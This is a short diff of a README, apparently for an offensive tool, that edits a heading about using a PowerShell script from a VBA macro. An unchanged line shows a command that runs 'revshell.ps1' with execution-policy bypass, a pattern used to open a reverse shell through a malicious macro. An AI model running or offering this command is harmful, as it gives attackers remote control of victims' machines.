@@ -1,6 +1,6 @@
 ## How to use it in VBA macro?
 
-### 1. Load ps1 file:
+### 1. Load as ps1 file:
 ```
 powershell -ep bypass -NoProfile -File revshell.ps1
 ```
